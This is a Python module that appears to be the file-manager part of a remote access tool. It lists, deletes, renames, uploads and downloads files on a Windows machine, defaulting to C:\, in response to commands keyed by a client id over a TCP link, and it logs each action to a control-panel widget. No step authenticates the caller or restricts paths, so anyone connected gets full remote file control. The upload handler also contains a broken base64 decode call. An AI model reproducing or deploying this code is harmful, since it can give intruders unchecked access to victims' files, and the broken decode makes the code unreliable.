import os
import socket
import threading
import json
from tcpmanager import send_to, get_log
from panel import logbox

BASE_DIR = "C:\\"

def log_event(cid, msg):
    logbox.insert("end", f"<FMG {cid}> {msg}\n")
    logbox.see("end")

def list_files(cid, path=None):
    try:
        dirpath = path or BASE_DIR
        files = os.listdir(dirpath)
        resp = json.dumps({"filelist":files,"path":dirpath})
        send_to(cid, f"FILELIST:{resp}".encode())
        log_event(cid, f"Listed files @ {dirpath}")
    except Exception as e:
        send_to(cid, f"FILEERROR:{str(e)}".encode())
        log_event(cid, f"Error listing files: {str(e)}")

def delete_file(cid, fpath):
    try:
        os.remove(fpath)
        send_to(cid, f"FILEDEL:OK:{fpath}".encode())
        log_event(cid, f"Deleted {fpath}")
    except Exception as e:
        send_to(cid, f"FILEDEL:ERR:{str(e)}".encode())
        log_event(cid, f"Error deleting {fpath}: {str(e)}")

def rename_file(cid, fpath, newname):
    try:
        os.rename(fpath, newname)
        send_to(cid, f"FILEREN:OK:{fpath}->{newname}".encode())
        log_event(cid, f"Renamed {fpath} to {newname}")
    except Exception as e:
        send_to(cid, f"FILEREN:ERR:{str(e)}".encode())
        log_event(cid, f"Error renaming {fpath}: {str(e)}")

def upload_file(cid, fpath, data):
    try:
        with open(fpath, "wb") as f:
            f.write(data)
        send_to(cid, f"FILEUP:OK:{fpath}".encode())
        log_event(cid, f"Uploaded {fpath}")
    except Exception as e:
        send_to(cid, f"FILEUP:ERR:{str(e)}".encode())
        log_event(cid, f"Error uploading {fpath}: {str(e)}")

def download_file(cid, fpath):
    try:
        with open(fpath, "rb") as f:
            data = f.read()
        send_to(cid, b"FILEDOWN:" + data)
        log_event(cid, f"Downloaded {fpath}")
    except Exception as e:
        send_to(cid, f"FILEDOWN:ERR:{str(e)}".encode())
        log_event(cid, f"Error downloading {fpath}: {str(e)}")

def handle_file_command(cid, raw):
    try:
        if raw.startswith("FILELIST:"):
            # Example: to client, path
            path = raw[len("FILELIST:"):]
            list_files(cid, path)
        elif raw.startswith("FILEDEL:"):
            fpath = raw[len("FILEDEL:"):]
            delete_file(cid, fpath)
        elif raw.startswith("FILEREN:"):
            payload = raw[len("FILEREN:"):]
            orig, new = payload.split("::")
            rename_file(cid, orig, new)
        elif raw.startswith("FILEUP:"):
            # receive base64 or bytes payload from client/panel
            payload = raw[len("FILEUP:"):]
            fpath, b64 = payload.split("::")
            data = b64.decode("base64") if isinstance(b64,str) else b64
            upload_file(cid, fpath, data)
        elif raw.startswith("FILEDOWN:"):
            fpath = raw[len("FILEDOWN:"):]
            download_file(cid, fpath)
        else:
            log_event(cid, f"Unrecognized file command: {raw}")
    except Exception as e:
        log_event(cid, f"File command error: {str(e)}")